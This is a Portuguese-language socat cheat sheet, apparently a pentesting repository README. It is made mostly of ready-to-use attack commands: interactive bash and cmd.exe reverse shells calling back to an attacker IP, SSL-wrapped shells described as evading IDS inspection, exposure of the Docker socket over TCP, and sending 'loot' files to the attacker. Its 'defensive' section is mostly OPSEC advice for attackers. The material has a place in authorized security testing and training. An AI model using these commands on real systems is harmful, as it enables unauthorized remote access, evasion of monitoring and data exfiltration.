<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔄 Socat - Folha de dicas completa

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
  ███████╗ ██████╗  ██████╗ █████╗ ████████╗
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝
  ███████╗██║   ██║██║     ███████║   ██║   
  ╚════██║██║   ██║██║     ██╔══██║   ██║   
  ███████║╚██████╔╝╚██████╗██║  ██║   ██║   
  ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝   
       Multipurpose Relay for Bidirectional Data Transfers & Full TTY Shells
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/Socat-SOcket_CAT-blue?style=for-the-badge" alt="Socat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Exploração e projéteis">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP_SSL_UNIX-green?style=for-the-badge" alt="Protocolos">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="Licença GPLv2">
</p>

<p alinhar="centro">
  <b>🌐 Estabeleça dois fluxos de bytes bidirecionais e transfira dados entre arquivos, pipes, dispositivos, soquetes e túneis SSL</b>
</p>

---

## 📋 Índice

- [Visão geral e arquitetura Socat](#-overview--the-socat-architecture)
- [Comparação Socat vs Netcat](#-socat-vs-netcat-comparação)
- [Instalação](#-instalação)
- [Conchas reversas TTY totalmente interativas](#-conchas totalmente interativas-tty-reversas)
  - [Ouvinte do invasor (RAW TTY)](#attacker-listener-raw-tty)
  - [Carga útil alvo (Pty Spawn)](#target-payload-pty-spawn)
  - [Windows Target Reverse Shell](#windows-target-reverse-shell)
- [Conchas reversas criptografadas via SSL/TLS](#-encrypted-reverse-shells-via-ssltls)
  - [Gerando Certificados](#generating-certificates)
  - [Ouvinte e conexão criptografados](#ouvinte criptografado--conexão)
- [Encaminhamento de porta e retransmissões de rede](#-port-forwarding--network-relays)
  - [Encaminhamento de porta local](#encaminhamento de porta local)
  - [Forking Listener (Multi-Cliente)](#forking-listener-multi-client)
  - [Soquete de domínio UNIX para relé TCP (encaminhamento do Docker)](#unix-domain-socket-to-tcp-relay-docker-forwarding)
- [Transferências de arquivos com Socat](#-transferências de arquivos com socat)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Considerações defensivas e OPSEC](#-considerações defensivas--opsec)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)

---

## 🎯 Visão geral e arquitetura Socat

**Socat** (SOcket CAT) é um utilitário baseado em linha de comando que estabelece dois fluxos de bytes bidirecionais e transfere dados entre eles. Como os fluxos podem ser construídos a partir de um grande conjunto de tipos de endereços (arquivos, pipes, dispositivos, soquetes TCP/UDP, SSL, IP bruto, SOCKS4, soquetes de domínio UNIX), o Socat é frequentemente descrito como Netcat com esteróides.

Em testes de penetração e Red Teaming, Socat é lendário por dois superpoderes principais:
1. **Conchas reversas TTY totalmente interativas instantâneas:** Gerando pseudoterminais verdadeiros (`pty`) com controle de trabalho, teclas de seta e preenchimento automático sem a necessidade de ginástica Python ou `stty raw -echo`.
2. **Túneis de rede SSL/TLS criptografados:** Ignorando a inspeção IDS padrão criptografando cargas de texto não criptografado por SSL.

---

## ⚖️ Comparação Socat vs Netcat

| Recurso | Netcat (`nc`) | Nmap `ncat` | Socat (`socat`) |
|--------|---------------|-------------|-----------------|
| **Spawn PTY Shell nativo** | ❌ Não | ❌ Não | ✅ Nativo (`pty,stderr,setsid`) |
| **Criptografia SSL/TLS** | ❌ Não | ✅ Sim (`--ssl`) | ✅ Nativo (`OPENSSL-LISTEN`, `OPENSSL`) |
| **Bifurcação de retransmissão multicliente**| ❌ Não | ❌ Não | ✅ Nativo (`fork,reuseaddr`) |
| **Soquetes de domínio UNIX** | ❌ Não | ✅ Limitado | ✅ Nativo (`UNIX-LISTEN`, `UNIX-CONNECT`) |
| **Tamanho do arquivo binário** | Mínimo (~40 KB) | Moderado (~500 KB) | Moderado (~400 KB independente) |
| **Sintaxe de comando** | Sinalizadores simples (`-lvnp`) | Baseado em bandeira (`-lvnp`) | Sintaxe de fluxo (`<type>:<args>`) |

---

## 📥 Instalação
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y socat

# Arch Linux
sudo pacman -S socat

# RedHat / CentOS / Fedora
sudo dnf install -y socat
```
---

## 💀 Shells reversos TTY totalmente interativos

Ao capturar um shell reverso com o Netcat padrão, você recebe um shell burro instável. Socat permite um pseudoterminal 100% estável e totalmente interativo com preenchimento de tabulação, manipulação de Ctrl + C e suporte a editor de tela (`vim`, `nano`).

### Ouvinte do invasor (RAW TTY)
```bash
# Listen on port 4444 and hook stdin/stdout directly to your current raw terminal
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
> [!NOTA]
> `file:`tty`,raw,echo=0` coloca seu terminal local em modo bruto e desativa o eco de caracteres. Se a conexão for fechada inesperadamente e seu terminal não responder, digite `reset` e pressione Enter.

### Carga útil alvo (Pty Spawn)
```bash
# Target connects back, spawning a fully interactive PTY bash shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```
#### Divisão de opções:
- `pty`: Aloca um pseudoterminal no sistema de destino.
- `stderr`: Redireciona o erro padrão para o soquete.
- `setsid`: Executa o processo em um novo grupo de sessão (evita a eliminação quando o pai sai).
- `sigint`: Passa sinais de interrupção (Ctrl+C) para o processo remoto em vez de encerrar a sessão.
- `sane`: redefine as configurações de controle do terminal para os padrões padrão.

### Shell reverso de destino do Windows
```bash
# Attacker listener
socat -d -d TCP-LISTEN:4444 STDOUT

# Windows Target connection
socat TCP:10.10.14.5:4444 EXEC:cmd.exe
```
---

## 🔐 Shells reversos criptografados via SSL/TLS

Evite que o Network Security Monitoring (NSM), Zeek e Snort inspecionem sua carga útil de shell reverso criptografando o tráfego com um certificado SSL/TLS efêmero.

### Gerando Certificados
```bash
# 1. Generate private key and self-signed certificate on attacker machine
openssl req -newkey rsa:2048 -nodes -keyout /tmp/socat.key -x509 -days 365 -out /tmp/socat.crt -subj "/CN=corp-update.local"

# 2. Combine key and cert into a single PEM bundle
cat /tmp/socat.key /tmp/socat.crt > /tmp/socat.pem
```
### Ouvinte e conexão criptografados
```bash
# 1. Attacker starts an SSL listener
socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:4443,cert=/tmp/socat.pem,verify=0

# 2. Target connects back over SSL
socat OPENSSL:10.10.14.5:4443,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
```
---

## 🔀 Encaminhamento de porta e retransmissões de rede

Socat pode encaminhar o tráfego de entrada de uma interface ou porta de rede diretamente para um destino remoto diferente.

### Encaminhamento de porta local
```bash
# Forward incoming connections on port 8080 to an internal database server
socat TCP-LISTEN:8080,fork TCP:192.168.1.50:3306
```
### Ouvinte de bifurcação (multicliente)

A opção `fork` permite que o Socat gere um processo filho para cada nova conexão de entrada, mantendo o ouvinte principal aberto:
```bash
# Multi-client HTTP proxy relay
socat TCP-LISTEN:80,fork,reuseaddr TCP:10.10.10.200:80
```
### Soquete de domínio UNIX para retransmissão TCP (encaminhamento do Docker)

Ao acessar um soquete daemon Docker local (`/var/run/docker.sock`) sem direitos de root na rede:
```bash
# Expose Docker UNIX socket over TCP port 2375
socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock

# Connect remotely from attacker machine
docker -H tcp://10.10.10.50:2375 ps
```
---

## 📁 Transferências de arquivos com Socat
```bash
# 1. Attacker prepares receiving listener
socat -u TCP-LISTEN:9001,reuseaddr OPEN:loot.tar.gz,creat

# 2. Target sends file to attacker
socat -u OPEN:loot.tar.gz TCP:10.10.14.5:9001
```
*(O sinalizador `-u` especifica o modo unidirecional do primeiro endereço para o segundo).*

---

## ⚡ Tabela de referência rápida

| Objetivo | Comando |
|-----------|---------|
| **Ouvinte TTY interativo** | `socat file:\`tty\`,raw,echo=0 tcp-listen:<PORT>` |
| **Carga útil TTY interativa** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>` |
| **Ouvinte SSL criptografado** | `socat file:\`tty\`,raw,echo=0 OPENSSL-LISTEN:<PORT>,cert=<PEM>,verify=0` |
| **Carga útil SSL criptografada** | `socat OPENSSL:<IP>:<PORT>,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane` |
| **Encaminhamento de porta (retransmissão)** | `socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:<RHOST>:<RPORT>` |
| **Expor o soquete UNIX** | `socat TCP-LISTEN:<PORT>,fork UNIX-CLIENT:<SOCKET_PATH>` |
| **Transferência de Arquivos (Receptor)** | `socat -u TCP-LISTEN:<PORT> OPEN:<OUTFILE>,creat` |
| **Transferência de arquivo (remetente)** | `socat -u OPEN:<INFILE> TCP:<IP>:<PORT>` |

---

## 🛡️ Considerações defensivas e OPSEC

1. **Criptografia de tráfego:** Shells reversos TCP de texto não criptografado expõem comandos para IDS/IPS. Sempre use `OPENSSL-LISTEN` e `OPENSSL` durante combates da equipe vermelha.
2. **Monitoramento de processos:** As plataformas Sysmon/EDR sinalizam comandos invocando `pty,stderr,setsid` como uma heurística de shell reversa imediata.
3. **Binários autônomos:** Ao implantar em sistemas de destino, use binários Socat autônomos compilados estaticamente para evitar dependências de bibliotecas compartilhadas.

---

## ⚠️ Isenção de responsabilidade legal

> [!CUIDADO]
> Esta folha de dicas destina-se apenas a testes de penetração autorizados, avaliações de segurança e pesquisas acadêmicas. O acesso não autorizado a sistemas informáticos e a adulteração de redes são estritamente ilegais.